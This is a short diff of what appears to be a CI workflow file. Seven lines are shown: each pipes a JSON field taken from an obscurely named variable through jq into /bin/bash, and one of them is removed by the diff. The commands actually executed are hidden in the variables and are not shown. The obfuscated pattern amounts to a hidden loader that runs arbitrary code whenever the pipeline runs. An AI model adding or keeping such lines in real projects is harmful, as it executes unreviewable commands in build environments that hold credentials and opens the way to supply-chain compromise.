@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$pp3" | jq -r .uo32 | /bin/bash
           echo $ieig65 | jq -r .qh05654 | /bin/bash
           echo $ho07 | jq -r .bw1 | /bin/bash
-          echo $p36669 | jq -r .plcj48420 | /bin/bash
           printf '%s' "$rjl8456" | jq -r .yv96048 | /bin/bash
           printf '%s' "$zfpo031" | jq -r .xf3 | /bin/bash
           printf '%s' "$nndof28654" | jq -r .ioe1 | /bin/bash
